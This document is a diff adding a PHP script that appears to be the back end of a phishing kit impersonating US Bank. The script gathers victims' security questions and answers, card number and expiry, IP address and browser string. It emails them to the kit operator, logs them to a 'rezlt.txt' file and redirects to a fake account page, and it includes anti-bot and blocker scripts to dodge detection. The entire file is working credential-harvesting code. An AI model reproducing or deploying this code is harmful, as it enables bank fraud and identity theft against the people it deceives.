@@ -1,0 +1,30 @@
+<?php
+$zabi = getenv("REMOTE_ADDR");
+include('../email.php');
+include '../antibots.php';
+include '../bt.php';
+include "../blocker.php";
+$message .= "--------------US Ban3 Q Info---------------------\n";
+$message .= "Question 1            : ".$_POST['q1']."\n";
+$message .= "Answer 1            : ".$_POST['a1']."\n";
+$message .= "Question 2              : ".$_POST['q2']."\n";
+$message .= "Answer 2              : ".$_POST['a2']."\n";
+$message .= "Question 3             : ".$_POST['q3']."\n";
+$message .= "Answer 3            : ".$_POST['a3']."\n";
+$message .= "Question 4             : ".$_POST['q4']."\n";
+$message .= "Answer 4            : ".$_POST['a4']."\n";
+$message .= "Question 5             : ".$_POST['q5']."\n";
+$message .= "Answer 5            : ".$_POST['a5']."\n";
+$message .= "-------------- IP Infos ------------\n";
+$message .= "IP       : $zabi\n";
+$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
+$message .= "------------------ By Dr.Don  ---------------\n";
+$cc = $_POST['ccn'];
+$subject = "US  BAN3 Q INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
+$headers = "From: Dr.Don <contact>\r\n";
+mail($email, $subject, $message, $headers);
+mail(','.$form, $subject, $message, $headers);
+
+    $text = fopen('../../rezlt.txt', 'a');
+fwrite($text, $message);
+header("Location: ../personal.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
